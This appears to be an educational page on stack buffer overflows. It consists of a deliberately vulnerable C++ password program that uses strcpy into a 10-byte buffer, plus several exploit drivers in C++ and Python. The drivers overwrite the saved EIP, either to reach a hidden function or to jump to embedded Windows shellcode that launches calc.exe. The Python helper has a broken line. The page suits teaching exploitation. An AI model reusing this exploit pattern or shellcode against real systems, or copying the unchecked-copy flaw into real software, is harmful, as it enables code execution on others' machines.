## Buffer Over Flow

### Some Examples

goodpwd.cpp

```C++
#include <iostream> 
#include <cstring>
 
int bf_overflow(char *str){ 
       char buffer[10]; 	//our buffer 
       strcpy(buffer,str);	//the vulnerable command 
       return 0; 
} 
 
int good_password(){ 		// a function which is never executed
       printf("Valid password supplied\n"); 
       printf("This is good_password function \n"); 
}
 
int main(int argc, char *argv[]) 
{ 
       int password=0; // controls whether password is valid or not 
       printf("You are in goodpwd.exe now\n"); 
       bf_overflow(argv[1]); //call the function and pass user input 
       if ( password == 1) { 
             good_password(); //this should never happen  
 }
 	 else {
       printf("Invalid Password!!!\n");
 } 
       printf("Quitting sample1.exe\n"); 
       return 0; 
}
```

* * *

goodpwd\_with\_BOF.cpp

```C++
#include <iostream> 
#include <cstring>

 
int bf_overflow(char *str){ 
       char buffer[10]; 	//our buffer 
       strcpy(buffer,str);	//the vulnerable command 
       return 0; 
} 
 
int good_password(){ 		// a function which is never executed
       printf("Valid password supplied\n"); 
       printf("This is good_password function \n"); 
}
 
int main(int argc, char *argv[]) 
{ 
       	int password=0; // controls whether password is valid or not 
       	printf("You are in goodpwd.exe now\n");
       
       	char junkbytes[50];   //Junk bytes before reaching the EIP
      	memset(junkbytes,0x41,22);	
       	char eip[] = "\x3B\x7D\x26\x77";
       	char shellcode[] =  //Shellcode that follows the EIP - this calls calc.exe 
        "\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
        "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
        "\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01"
        "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75"
        "\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
        "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
        "\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53"
        "\x53\x53\x53\x53\x52\x53\xff\xd7";


        char command[2000];	
        strcat(command, junkbytes);
        strcat(command, eip);
        strcat(command, shellcode);	
       
       	bf_overflow(command); //call the function and pass user input 
       	if ( password == 1) { 
            good_password(); //this should never happen  
 }
 	 else {
       printf("Invalid Password!!!\n");
 } 
       printf("Quitting sample1.exe\n"); 
       return 0; 
}
```

* * *

helper.cpp

```C++
#include <iostream>
#include <cstring>

int main(int argc, char *argv[])
{
  char command[256];
  char parameter[128];
  
 memset(parameter,0x41,22); // fill the parameter with 'A' character
  
  // now modify the location which overwrites the EIP
  
  parameter[22]= 0x48;
  parameter[23]= 0x15;
  parameter[24]= 0x40;
  parameter[25]= 0x00;

  parameter[26] = 0 ;  /* null terminate the parameter so as previous frames are not overwritten */
  
  strcpy(command , "goodpwd.exe ");
  strcat(command, parameter);
  
  printf("%s\n",command);
  
  system(command);	/* execute the command */
  return 0;
}
```

* * *

helper2.cpp

```c++
#include <iostream>
#include <cstring>
 
int main(int argc, char *argv[])
{
    char command[500];  	//contains the command to run
    char junkbytes[50];   //Junk bytes before reaching the EIP
    memset(junkbytes,0x41,22);
    char eip[] = "\x3B\x7D\x26\x77";   //Value to overwrite on the EIP - JMP ESP
    char shellcode[] =  //Shellcode that follows the EIP - this calls calc.exe 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
    "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
    "\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01"
    "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75"
    "\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
    "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
    "\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53"
    "\x53\x53\x53\x53\x52\x53\xff\xd7";
    
    strcpy(command , "goodpwd.exe ");   // call goodpwd.exe 
    strcat(command, junkbytes);  // append junk bytes as argument
    strcat(command, eip);	  // append the EIP to the argument
    strcat(command, shellcode);  // append the shellcode to the argument
    
    printf("%s\n",command);
    
    system(command);	/* execute the command */
    return 0;
}
```

* * *

helper.py

```python3
import sys
import os
payload = "\x41"*22
payload += "\x48\x15\x40"
command = "goodpwd.exe %s" % (payload)

print path
os.system(command)
```
***